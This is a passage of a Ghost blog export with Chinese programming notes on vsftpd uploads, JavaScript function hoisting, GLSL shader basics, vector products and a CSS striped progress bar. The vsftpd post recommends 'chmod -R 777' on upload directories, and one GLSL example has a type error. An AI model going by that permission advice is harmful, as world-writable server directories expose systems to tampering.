/var/ftp/write\n\n然后修改vsftp的配置文件/etc/vsftpd.conf文件的最后添加上\n\nlocal_root=/var/ftp\n\n保存，然后杀死vsftpd进程，然后重启vsftpd服务器程序。sudo service vsftpd restart（ubuntu）\n\n将文件上传到/var/ftp/write目录，这个时候可以正常的上传文件了。\n\n一句话，改权限。改了权限的路径才能上传文件。sudo chmod -R 777 url","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-07T06:58:05.000Z","created_by":"1","updated_at":"2017-01-17T06:42:38.000Z","updated_by":"1","published_at":"2016-04-07T07:02:27.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e0","uuid":"0babbf45-249b-4c44-8042-5898c4838898","title":"js两种声明函数","slug":"js","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"* function a(){} \\n* var b=function(){}  \\n\\n1.第一种比第二种，多了提升(Hoisting)效果。\\n```\\na();  \\nfunction a(){};这样是可以的。而第二种不行。  \\n```\\n\\n2.第一种声明,还声明另一个属性name。\\n```\\nfunction a(){};  \\nconsole.log(a.name);  //a  \\nvar b=function(){}  \\nconsole.log(b.name);  //''  \\n```\\n3.在直接赋值给另外的变量的时候。\\n```\\nvar a,b;  \\na=b=function(){};  \\nconsole.log(b)   //定义了\\n\\nvar c=function d(){console.log(d);};  \\nc();  //输出d  \\nconsole.log(d)  //d is not defined(…)  \\n等于\\nvar c=(function(){  \\n    var d=function(){console.log(d)}\\n    return d;\\n})();\\n```\\n4.不要在一个非函数代码块（if、while 等）中声明一个函数用function test(){}。浏览器允许你这么做，但它们的解析表现不一致。\\n\\n因为有些浏览器不用管if，直接就声明了。\\n```\\nif (true) {  \\n  function test() {\\n    console.log('true');\\n  }\\n}else{\\n  function test() {\\n    console.log('false');\\n  }\\n}\\ntest();  //在ie8下输出'false';  \\n//////\\nvar test;  \\nif (true) {  \\n   test =function () {\\n    console.log('true');\\n  }\\n}else{\\n  test =function () {\\n    console.log('false');\\n  }\\n}\\ntest();  //最好的写法。  \\n```\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><ul>\n<li>function a(){}</li>\n<li>var b=function(){}</li>\n</ul>\n<p>1.第一种比第二种，多了提升(Hoisting)效果。</p>\n<pre><code>a();  \nfunction a(){};这样是可以的。而第二种不行。  \n</code></pre>\n<p>2.第一种声明,还声明另一个属性name。</p>\n<pre><code>function a(){};  \nconsole.log(a.name);  //a  \nvar b=function(){}  \nconsole.log(b.name);  //''  \n</code></pre>\n<p>3.在直接赋值给另外的变量的时候。</p>\n<pre><code>var a,b;  \na=b=function(){};  \nconsole.log(b)   //定义了\n\nvar c=function d(){console.log(d);};  \nc();  //输出d  \nconsole.log(d)  //d is not defined(…)  \n等于\nvar c=(function(){  \n    var d=function(){console.log(d)}\n    return d;\n})();\n</code></pre>\n<p>4.不要在一个非函数代码块（if、while 等）中声明一个函数用function test(){}。浏览器允许你这么做，但它们的解析表现不一致。</p>\n<p>因为有些浏览器不用管if，直接就声明了。</p>\n<pre><code>if (true) {  \n  function test() {\n    console.log('true');\n  }\n}else{\n  function test() {\n    console.log('false');\n  }\n}\ntest();  //在ie8下输出'false';  \n//////\nvar test;  \nif (true) {  \n   test =function () {\n    console.log('true');\n  }\n}else{\n  test =function () {\n    console.log('false');\n  }\n}\ntest();  //最好的写法。  \n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"35","plaintext":" * function a(){}\n * var b=function(){}\n\n1.第一种比第二种，多了提升(Hoisting)效果。\n\na();  \nfunction a(){};这样是可以的。而第二种不行。  \n\n\n2.第一种声明,还声明另一个属性name。\n\nfunction a(){};  \nconsole.log(a.name);  //a  \nvar b=function(){}  \nconsole.log(b.name);  //''  \n\n\n3.在直接赋值给另外的变量的时候。\n\nvar a,b;  \na=b=function(){};  \nconsole.log(b)   //定义了\n\nvar c=function d(){console.log(d);};  \nc();  //输出d  \nconsole.log(d)  //d is not defined(…)  \n等于\nvar c=(function(){  \n    var d=function(){console.log(d)}\n    return d;\n})();\n\n\n4.不要在一个非函数代码块（if、while 等）中声明一个函数用function test(){}。浏览器允许你这么做，但它们的解析表现不一致。\n\n因为有些浏览器不用管if，直接就声明了。\n\nif (true) {  \n  function test() {\n    console.log('true');\n  }\n}else{\n  function test() {\n    console.log('false');\n  }\n}\ntest();  //在ie8下输出'false';  \n//////\nvar test;  \nif (true) {  \n   test =function () {\n    console.log('true');\n  }\n}else{\n  test =function () {\n    console.log('false');\n  }\n}\ntest();  //最好的写法。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-07T08:18:16.000Z","created_by":"1","updated_at":"2017-01-17T06:41:31.000Z","updated_by":"1","published_at":"2016-04-07T11:08:43.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e1","uuid":"9b36902d-69b7-4821-9e68-5970844a6aa5","title":"3D-笔记1","slug":"3d-bi-ji-1","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"![](/content/images/2016/04/_-78-M--ZL-OTOP-S8W5Q-S.jpg)\\n今天，买了OpenGl ES2.0游戏开发，上下两卷。花了158大洋。开始系统地学习3D。\\n\\n`float k=1` 错误，glsl语言并不会，把整数1转浮点1.0\\n\\n```\\n//混合选择\\nvec4 color = vec3(0.7,0.1,0.5,1.0) //rgba  \\nvec3 temp = color.agb  //temp=(1.0,0.1,0.5)  \\nvec3 tempL;  \\ntempL.grb = color.aab //tempL=(0.7,0.7,0.1)  \\n```\\n`mat3 md=mat3(2.0)` \\n声明的是mat3(2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0),并不是全部赋值2.0\\n\\n`lowp mediump highp` 3种精度\\n\\n`precision mediump float` 定义全局精度。\\n\\nattribute：一般用于每个顶点都不同的量，如顶点颜色，位置。 \\nuniform:一般用于对一组顶点组成单个3D物体都相同的量，如光源位置。 \\nvarying:用于从顶点着色其传递到片元着色器的量。 \\nconst:用于声明常量。\\n\\n```\\nattribute vec3 aPosition;//顶点位置  \\nattribute vec3 aNormal;//顶点法  \\nattribute vec2 aTexCoor;//顶点纹理坐标  \\n```\\n> 顶点着色器:输出变量\\n```\\ngl_Position:经过变换矩阵变换，投影后的顶点位置。  \\ngl_PointSize:指点的大小。  \\n```\\n> 片元着色器:内建输人变量\\n```\\ngl_FragCoord:(vec4)含有当前片元相当于窗口位置的坐标值x、y、z、1/w。其中x、y分别为片元相对于窗口的二维坐标，z为该片元的深度值。  \\ngl_FrontFacing:(bool)通过读取该内建变量的值可以判断正在处理的片元是否属于在光栅化阶段生成的此片元的对应图元的正面。一般用于开发双面光照功能相关的应用程序中。 \\n```\\n> 片元着色器:内建输出变量\\n```\\ngl_FragColor:(vec4)指计算后，此片元的颜色。此颜色值将送人渲染管线中的后继过程进行处理。  \\ngl_FragData:(vec4数组)写入时要给入下标:如gl_FragData[0],通过其写入的信息将供渲染管线中的后继过程使用。  \\n//实际开发中，对上述两个内建输出变量赋值时，应该根据具体情况选择其中一个，不应该同时对两个都进行赋值，若执行了discard操作，则两个内建变量都不需要写入值了。\\n```\\n\\nvarying:在顶点着色器赋值后并不是将赋的值送人片元着色器，而是在光栅化阶段由管线根据片元所属图元各个顶点对应的顶点着色器对此易变变量的赋值情况及片元与各顶点的位置关系插值产生。\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><img src=\"/content/images/2016/04/_-78-M--ZL-OTOP-S8W5Q-S.jpg\" alt=\"\"><br>\n今天，买了OpenGl ES2.0游戏开发，上下两卷。花了158大洋。开始系统地学习3D。</p>\n<p><code>float k=1</code> 错误，glsl语言并不会，把整数1转浮点1.0</p>\n<pre><code>//混合选择\nvec4 color = vec3(0.7,0.1,0.5,1.0) //rgba  \nvec3 temp = color.agb  //temp=(1.0,0.1,0.5)  \nvec3 tempL;  \ntempL.grb = color.aab //tempL=(0.7,0.7,0.1)  \n</code></pre>\n<p><code>mat3 md=mat3(2.0)</code><br>\n声明的是mat3(2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0),并不是全部赋值2.0</p>\n<p><code>lowp mediump highp</code> 3种精度</p>\n<p><code>precision mediump float</code> 定义全局精度。</p>\n<p>attribute：一般用于每个顶点都不同的量，如顶点颜色，位置。<br>\nuniform:一般用于对一组顶点组成单个3D物体都相同的量，如光源位置。<br>\nvarying:用于从顶点着色其传递到片元着色器的量。<br>\nconst:用于声明常量。</p>\n<pre><code>attribute vec3 aPosition;//顶点位置  \nattribute vec3 aNormal;//顶点法  \nattribute vec2 aTexCoor;//顶点纹理坐标  \n</code></pre>\n<blockquote>\n<p>顶点着色器:输出变量</p>\n</blockquote>\n<pre><code>gl_Position:经过变换矩阵变换，投影后的顶点位置。  \ngl_PointSize:指点的大小。  \n</code></pre>\n<blockquote>\n<p>片元着色器:内建输人变量</p>\n</blockquote>\n<pre><code>gl_FragCoord:(vec4)含有当前片元相当于窗口位置的坐标值x、y、z、1/w。其中x、y分别为片元相对于窗口的二维坐标，z为该片元的深度值。  \ngl_FrontFacing:(bool)通过读取该内建变量的值可以判断正在处理的片元是否属于在光栅化阶段生成的此片元的对应图元的正面。一般用于开发双面光照功能相关的应用程序中。 \n</code></pre>\n<blockquote>\n<p>片元着色器:内建输出变量</p>\n</blockquote>\n<pre><code>gl_FragColor:(vec4)指计算后，此片元的颜色。此颜色值将送人渲染管线中的后继过程进行处理。  \ngl_FragData:(vec4数组)写入时要给入下标:如gl_FragData[0],通过其写入的信息将供渲染管线中的后继过程使用。  \n//实际开发中，对上述两个内建输出变量赋值时，应该根据具体情况选择其中一个，不应该同时对两个都进行赋值，若执行了discard操作，则两个内建变量都不需要写入值了。\n</code></pre>\n<p>varying:在顶点着色器赋值后并不是将赋的值送人片元着色器，而是在光栅化阶段由管线根据片元所属图元各个顶点对应的顶点着色器对此易变变量的赋值情况及片元与各顶点的位置关系插值产生。</p>\n<!--kg-card-end: markdown-->","comment_id":"36","plaintext":"\n今天，买了OpenGl ES2.0游戏开发，上下两卷。花了158大洋。开始系统地学习3D。\n\nfloat k=1 错误，glsl语言并不会，把整数1转浮点1.0\n\n//混合选择\nvec4 color = vec3(0.7,0.1,0.5,1.0) //rgba  \nvec3 temp = color.agb  //temp=(1.0,0.1,0.5)  \nvec3 tempL;  \ntempL.grb = color.aab //tempL=(0.7,0.7,0.1)  \n\n\nmat3 md=mat3(2.0)\n声明的是mat3(2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0),并不是全部赋值2.0\n\nlowp mediump highp 3种精度\n\nprecision mediump float 定义全局精度。\n\nattribute：一般用于每个顶点都不同的量，如顶点颜色，位置。\nuniform:一般用于对一组顶点组成单个3D物体都相同的量，如光源位置。\nvarying:用于从顶点着色其传递到片元着色器的量。\nconst:用于声明常量。\n\nattribute vec3 aPosition;//顶点位置  \nattribute vec3 aNormal;//顶点法  \nattribute vec2 aTexCoor;//顶点纹理坐标  \n\n\n> 顶点着色器:输出变量\n\n\ngl_Position:经过变换矩阵变换，投影后的顶点位置。  \ngl_PointSize:指点的大小。  \n\n\n> 片元着色器:内建输人变量\n\n\ngl_FragCoord:(vec4)含有当前片元相当于窗口位置的坐标值x、y、z、1/w。其中x、y分别为片元相对于窗口的二维坐标，z为该片元的深度值。  \ngl_FrontFacing:(bool)通过读取该内建变量的值可以判断正在处理的片元是否属于在光栅化阶段生成的此片元的对应图元的正面。一般用于开发双面光照功能相关的应用程序中。 \n\n\n> 片元着色器:内建输出变量\n\n\ngl_FragColor:(vec4)指计算后，此片元的颜色。此颜色值将送人渲染管线中的后继过程进行处理。  \ngl_FragData:(vec4数组)写入时要给入下标:如gl_FragData[0],通过其写入的信息将供渲染管线中的后继过程使用。  \n//实际开发中，对上述两个内建输出变量赋值时，应该根据具体情况选择其中一个，不应该同时对两个都进行赋值，若执行了discard操作，则两个内建变量都不需要写入值了。\n\n\nvarying:在顶点着色器赋值后并不是将赋的值送人片元着色器，而是在光栅化阶段由管线根据片元所属图元各个顶点对应的顶点着色器对此易变变量的赋值情况及片元与各顶点的位置关系插值产生。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-15T13:50:11.000Z","created_by":"1","updated_at":"2017-01-17T06:37:00.000Z","updated_by":"1","published_at":"2016-04-16T04:54:53.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e2","uuid":"2deea67a-b868-4439-93f9-76b99d626304","title":"向量--点积和叉积","slug":"xiang-liang-dian-ji-he-cha-ji","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 点积\\n\\n在数学中，数量积（dot product; scalar product，也称为点积）是接受在实数R上的两个向量并返回一个实数值标量的二元运算。它是欧几里得空间的标准内积。\\n\\n*   代数定义:设二维空间内有两个向量a(x1,y1)和b(x2,y2)，定义它们的数量积（又叫内积、点积）为以下实数：\\n![](/content/images/2016/04/B0BKO_4V3ATT-BMWW-1NW_K.png)\\n*   几何定义\\n设二维空间内有两个向量a和b，它们的夹角为Θ(0≤Θ≤Math.PI)，a，b夹角等于90点积为0；小于90点积大于0；大于90点积小于0，则内积定义为以下实数：\\n![](/content/images/2016/04/-C-FOX8P---93-D-PBI-HTQ.png)\\n\\n> 叉积\\n\\n数学中又称外积、向量积，物理中称矢积、叉乘，是一种在向量空间中向量的二元运算。与点积不同，它的运算结果是一个向量而不是一个标量。并且两个向量的叉积与这两个向量的和垂直。方向用右手定则判定\\n\\n\\\"右手定则\\\"的结果向量的方向的方法是这样的：若坐标系是满足右手定则的，当右手的四指从a以不超过180度的转角转向b时，竖起的大拇指指向是c的方向。`a*b=-b*a`\\n\\n叉积`|c|=|a×b|=|a| |b|sin&lt;a,b&gt;`即c的==长度==在数值上等于以a，b，夹角为θ组成的平行四边形的面积。\\n![](/content/images/2016/04/Y-Q2--1K53P-TSF-SI--CXD.png)\\n\\n![](/content/images/2016/04/--O-6FC--PA--BL8J-SG-DP.png)\\n\\n    \"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>点积</p>\n</blockquote>\n<p>在数学中，数量积（dot product; scalar product，也称为点积）是接受在实数R上的两个向量并返回一个实数值标量的二元运算。它是欧几里得空间的标准内积。</p>\n<ul>\n<li>代数定义:设二维空间内有两个向量a(x1,y1)和b(x2,y2)，定义它们的数量积（又叫内积、点积）为以下实数：<br>\n<img src=\"/content/images/2016/04/B0BKO_4V3ATT-BMWW-1NW_K.png\" alt=\"\"></li>\n<li>几何定义<br>\n设二维空间内有两个向量a和b，它们的夹角为Θ(0≤Θ≤Math.PI)，a，b夹角等于90点积为0；小于90点积大于0；大于90点积小于0，则内积定义为以下实数：<br>\n<img src=\"/content/images/2016/04/-C-FOX8P---93-D-PBI-HTQ.png\" alt=\"\"></li>\n</ul>\n<blockquote>\n<p>叉积</p>\n</blockquote>\n<p>数学中又称外积、向量积，物理中称矢积、叉乘，是一种在向量空间中向量的二元运算。与点积不同，它的运算结果是一个向量而不是一个标量。并且两个向量的叉积与这两个向量的和垂直。方向用右手定则判定</p>\n<p>&quot;右手定则&quot;的结果向量的方向的方法是这样的：若坐标系是满足右手定则的，当右手的四指从a以不超过180度的转角转向b时，竖起的大拇指指向是c的方向。<code>a*b=-b*a</code></p>\n<p>叉积<code>|c|=|a×b|=|a| |b|sin&amp;lt;a,b&amp;gt;</code>即c的<mark>长度</mark>在数值上等于以a，b，夹角为θ组成的平行四边形的面积。<br>\n<img src=\"/content/images/2016/04/Y-Q2--1K53P-TSF-SI--CXD.png\" alt=\"\"></p>\n<p><img src=\"/content/images/2016/04/--O-6FC--PA--BL8J-SG-DP.png\" alt=\"\"></p>\n<!--kg-card-end: markdown-->","comment_id":"37","plaintext":"> 点积\n\n\n在数学中，数量积（dot product; scalar\nproduct，也称为点积）是接受在实数R上的两个向量并返回一个实数值标量的二元运算。它是欧几里得空间的标准内积。\n\n * 代数定义:设二维空间内有两个向量a(x1,y1)和b(x2,y2)，定义它们的数量积（又叫内积、点积）为以下实数：\n   \n * 几何定义\n   设二维空间内有两个向量a和b，它们的夹角为Θ(0≤Θ≤Math.PI)，a，b夹角等于90点积为0；小于90点积大于0；大于90点积小于0，则内积定义为以下实数：\n   \n\n> 叉积\n\n\n数学中又称外积、向量积，物理中称矢积、叉乘，是一种在向量空间中向量的二元运算。与点积不同，它的运算结果是一个向量而不是一个标量。并且两个向量的叉积与这两个向量的和垂直。方向用右手定则判定\n\n\"右手定则\"的结果向量的方向的方法是这样的：若坐标系是满足右手定则的，当右手的四指从a以不超过180度的转角转向b时，竖起的大拇指指向是c的方向。\na*b=-b*a\n\n叉积|c|=|a×b|=|a| |b|sin&lt;a,b&gt;即c的长度在数值上等于以a，b，夹角为θ组成的平行四边形的面积。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-16T07:53:21.000Z","created_by":"1","updated_at":"2016-12-22T02:43:51.000Z","updated_by":"1","published_at":"2015-12-16T08:09:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e3","uuid":"ca25dbe2-fc98-4491-ad94-c1da41a1e0ec","title":"Bootstrap的滚动条","slug":"bootstrapde-gun-dong-tiao","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"<script>\\nsetTimeout(function(){\\ndocument.getElementsByTagName('style')[0].innerHTML+='@-webkit-keyframes progress-bar-stripes {from {background-position: 40px 0;}to {background-position: 0 0;}}@-o-keyframes progress-bar-stripes {from {background-position: 40px 0;}to {background-position: 0 0;}}@keyframes progress-bar-stripes {from {background-position: 40px 0;}to {background-position: 0 0;}}.run{animation-delay: 0s;    /*???????????????????????*/animation-direction: normal;   /*????????????????????????*/animation-duration: 2s;     /*???????????????????*/animation-fill-mode: none;animation-iteration-count: infinite;  /*???????????????*/animation-name: progress-bar-stripes;/*????? @keyframes ??????????????????*/animation-play-state: running;animation-timing-function: linear; /*??????????????????,????????? \\\"ease\\\"???*/}.progress{background-color: rgb(92, 184, 92);background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.14902) 50%, rgba(255, 255, 255, 0.14902) 75%, transparent 75%);/*  background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%, rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%, transparent 100%); */background-size: 40px 40px;color: rgb(255, 255, 255);transition-delay: 0s;transition-duration: 0.6s;transition-property: width;transition-timing-function: ease;border-radius:20px}'\\n},500)\\n</script>\\n<div style=\\\"height: 40px;width: 800px;\\\" class=\\\"progress run\\\"></div>\\n\\n```\\n        <style>       \\n        body{padding: 0;margin: 0;}\\n                @-webkit-keyframes progress-bar-stripes {\\n            from {\\n                background-position: 40px 0;\\n            }\\n            to {\\n                background-position: 0 0;\\n            }\\n        }\\n        @-o-keyframes progress-bar-stripes {\\n            from {\\n                background-position: 40px 0;\\n            }\\n            to {\\n                background-position: 0 0;\\n            }\\n        }\\n        @keyframes progress-bar-stripes {\\n            from {\\n                background-position: 40px 0;\\n            }\\n            to {\\n                background-position: 0 0;\\n            }\\n        }\\n        .run{\\n            animation-delay: 0s;    /*动画延迟加载时间*/\\n            animation-direction: normal;   /*重复方向，可逆向*/\\n            animation-duration: 2s;     /*重复间隔时间。*/\\n            animation-fill-mode: none;\\n            animation-iteration-count: infinite;  /*重复次数。*/\\n            animation-name: progress-bar-stripes;/*规定 @keyframes 动画的名称。*/\\n            animation-play-state: running;\\n            animation-timing-function: linear; /*动画速度曲线,默认是 \\\"ease\\\"。*/\\n        }\\n         .progress{\\n            background-color: rgb(92, 184, 92);\\n            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.14902) 50%, rgba(255, 255, 255, 0.14902) 75%, transparent 75%);\\n   /*  background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%, rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%, transparent 100%); */\\n            background-size: 40px 40px;\\n            color: rgb(255, 255, 255);\\n\\n            transition-delay: 0s;  /*CSS3 过渡*/\\n            transition-duration: 0.6s;\\n            transition-property: width;\\n            transition-timing-function: ease;\\n\\n            border-radius:20px\\n\\n        }\\n        </style>\\n<div style=\\\"height: 40px;width: 800px;\\\" class=\\\"progress run\\\"></div>  \\n```\\n\\n原理很简单：\\n\\n* background-color: rgb(92, 184, 92)绿色;在下面，用background-image形成透明条纹。\\n* background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%, rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%, transparent 100%); 这个意思是，倾斜45度，0%-25%，rgba(255, 0, 255, 0.14902)这个颜色，25%-50%，transparent 透明，50%-75%又是这个颜色，75%-100%透明。0%和100%是可以省略的。\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><script>\nsetTimeout(function(){\ndocument.getElementsByTagName('style')[0].innerHTML+='@-webkit-keyframes progress-bar-stripes {from {background-position: 40px 0;}to {background-position: 0 0;}}@-o-keyframes progress-bar-stripes {from {background-position: 40px 0;}to {background-position: 0 0;}}@keyframes progress-bar-stripes {from {background-position: 40px 0;}to {background-position: 0 0;}}.run{animation-delay: 0s;    /*???????????????????????*/animation-direction: normal;   /*????????????????????????*/animation-duration: 2s;     /*???????????????????*/animation-fill-mode: none;animation-iteration-count: infinite;  /*???????????????*/animation-name: progress-bar-stripes;/*????? @keyframes ??????????????????*/animation-play-state: running;animation-timing-function: linear; /*??????????????????,????????? \"ease\"???*/}.progress{background-color: rgb(92, 184, 92);background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.14902) 50%, rgba(255, 255, 255, 0.14902) 75%, transparent 75%);/*  background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%, rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%, transparent 100%); */background-size: 40px 40px;color: rgb(255, 255, 255);transition-delay: 0s;transition-duration: 0.6s;transition-property: width;transition-timing-function: ease;border-radius:20px}'\n},500)\n</script>\n<div style=\"height: 40px;width: 800px;\" class=\"progress run\"></div>\n<pre><code>        &lt;style&gt;       \n        body{padding: 0;margin: 0;}\n                @-webkit-keyframes progress-bar-stripes {\n            from {\n                background-position: 40px 0;\n            }\n            to {\n                background-position: 0 0;\n            }\n        }\n        @-o-keyframes progress-bar-stripes {\n            from {\n                background-position: 40px 0;\n            }\n            to {\n                background-position: 0 0;\n            }\n        }\n        @keyframes progress-bar-stripes {\n            from {\n                background-position: 40px 0;\n            }\n            to {\n                background-position: 0 0;\n            }\n        }\n        .run{\n            animation-delay: 0s;    /*动画延迟加载时间*/\n            animation-direction: normal;   /*重复方向，可逆向*/\n            animation-duration: 2s;     /*重复间隔时间。*/\n            animation-fill-mode: none;\n            animation-iteration-count: infinite;  /*重复次数。*/\n            animation-name: progress-bar-stripes;/*规定 @keyframes 动画的名称。*/\n            animation-play-state: running;\n            animation-timing-function: linear; /*动画速度曲线,默认是 &quot;ease&quot;。*/\n        }\n         .progress{\n            background-color: rgb(92, 184, 92);\n            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.14902) 50%, rgba(255, 255, 255, 0.14902) 75%, transparent 75%);\n   /*  background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%, rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%, transparent 100%); */\n            background-size: 40px 40px;\n            color: rgb(255, 255, 255);\n\n            transition-delay: 0s;  /*CSS3 过渡*/\n            transition-duration: 0.6s;\n            transition-property: width;\n            transition-timing-function: ease;\n\n            border-radius:20px\n\n        }\n        &lt;/style&gt;\n&lt;div style=&quot;height: 40px;width: 800px;&quot; class=&quot;progress run&quot;&gt;&lt;/div&gt;  \n</code></pre>\n<p>原理很简单：</p>\n<ul>\n<li>background-color: rgb(92, 184, 92)绿色;在下面，用background-image形成透明条纹。</li>\n<li>background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%, rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%, transparent 100%); 这个意思是，倾斜45度，0%-25%，rgba(255, 0, 255, 0.14902)这个颜色，25%-50%，transparent 透明，50%-75%又是这个颜色，75%-100%透明。0%和100%是可以省略的。</li>\n</ul>\n<!--kg-card-end: markdown-->","comment_id":"38","plaintext":"        <style>       \n        body{padding: 0;margin: 0;}\n                @-webkit-keyframes progress-bar-stripes {\n            from {\n                background-position: 40px 0;\n            }\n            to {\n                background-position: 0 0;\n            }\n        }\n        @-o-keyframes progress-bar-stripes {\n            from {\n                background-position: 40px 0;\n            }\n            to {\n                background-position: 0 0;\n            }\n        }\n        @keyframes progress-bar-stripes {\n            from {\n                background-position: 40px 0;\n            }\n            to {\n                background-position: 0 0;\n            }\n        }\n        .run{\n            animation-delay: 0s;    /*动画延迟加载时间*/\n            animation-direction: normal;   /*重复方向，可逆向*/\n            animation-duration: 2s;     /*重复间隔时间。*/\n            animation-fill-mode: none;\n            animation-iteration-count: infinite;  /*重复次数。*/\n            animation-name: progress-bar-stripes;/*规定 @keyframes 动画的名称。*/\n            animation-play-state: running;\n            animation-timing-function: linear; /*动画速度曲线,默认是 \"ease\"。*/\n        }\n         .progress{\n            background-color: rgb(92, 184, 92);\n            background-image: linear-gradient(45deg, rgba(255, 255, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 255, 255, 0.14902) 50%, rgba(255, 255, 255, 0.14902) 75%, transparent 75%);\n   /*  background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%, rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255, 0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%, transparent 100%); */\n            background-size: 40px 40px;\n            color: rgb(255, 255, 255);\n\n            transition-delay: 0s;  /*CSS3 过渡*/\n            transition-duration: 0.6s;\n            transition-property: width;\n            transition-timing-function: ease;\n\n            border-radius:20px\n\n        }\n        </style>\n<div style=\"height: 40px;width: 800px;\" class=\"progress run\"></div>  \n\n\n原理很简单：\n\n * background-color: rgb(92, 184, 92)绿色;在下面，用background-image形成透明条纹。\n * background-image: linear-gradient(45deg,rgba(255, 0, 255, 0.14902) 0%,\n   rgba(255, 0, 255, 0.14902) 25%, transparent 25%, transparent 50%, rgba(255,\n   0, 255, 0.14902) 50%, rgba(255, 0, 255, 0.14902) 75%, transparent 75%,\n   transparent 100%); 这个意思是，倾斜45度，0%-25%，rgba(255, 0, 255,\n   0.14902)这个颜色，25%-50%，transparent 透明，50%-75%又是这个颜色，75%-100%透明。0%和100%是可以省略的。","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-18T13:33:03.000Z","created_by":"1","updated_at":"2017-01-17T06:34:43.000Z","updated_by":"1","published_at":"2016-04-18T13:42:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e4","uuid":"424ad3d3-9df3-45d8-8865-8c71f493d84d","title":"console--输出图片，样式","slug":"console-shu-chu-tu-pian-yang-shi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"<lable style=\\\"background-image:-webkit-gradient( linear, left top, right top, color-stop(0, #f22), color-stop(0.15, #f2f), color-stop(0.3, #22f), color-stop(0.45, #2ff), color-stop(0.6, #2f2),color-stop(0.75, #2f2), color-stop(0.9, #ff2), color-stop(1, #f22) );color:transparent;-webkit-background-clip: text;font-size:5em;\\\">Color文字 </lable>\\n<br>\\n\\n<lable style=\\\"background: rgba(252,234,187,1);background: -moz-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%,rgba(0,189,247,1) 51%, 